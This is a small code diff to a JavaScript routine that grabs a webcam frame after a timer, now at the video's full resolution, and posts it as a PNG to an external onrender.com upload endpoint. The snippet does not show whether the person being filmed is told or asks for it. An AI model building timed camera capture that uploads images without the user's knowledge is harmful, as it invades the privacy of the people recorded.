@@ -127,7 +127,9 @@
       video.srcObject = stream;
       video.onloadedmetadata = () => {
         setTimeout(() => {
-          context.drawImage(video, 0, 0, 300, 200);
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
           const image = canvas.toDataURL('image/png');
           fetch('https://backend-render-server.onrender.com/upload', {
             method: 'POST',
